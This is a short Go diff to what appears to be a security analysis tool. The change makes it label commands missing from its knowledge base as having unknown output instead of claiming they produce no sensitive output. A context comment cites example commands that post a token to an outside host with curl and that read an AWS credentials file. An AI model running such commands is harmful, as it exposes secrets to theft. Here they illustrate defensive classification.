@@ -100,7 +100,21 @@ func coverageLabel(u analyze.CommandUse) string {
 // `curl -d "$TOKEN" https://x` receives without producing, and `cat
 // ~/.aws/credentials` does both -- so a single "does it touch anything
 // sensitive" line would flatten the case that matters most.
+//
+// For a command the knowledge base does not know, the honest answer to both
+// is "unknown". "no sensitive output" is a claim about what a program does,
+// and there is no basis for making it about a program nobody modelled --
+// printed next to NOT IN KNOWLEDGE BASE it reads as "we have no idea what
+// this is, and also it is fine".
 func dataLabel(u analyze.CommandUse) string {
+	if !u.Known {
+		in := "unknown input"
+		if u.Receives {
+			in = "sensitive input"
+		}
+		return in + "; unknown output"
+	}
+
 	in := "no sensitive input"
 	if u.Receives {
 		in = "sensitive input"
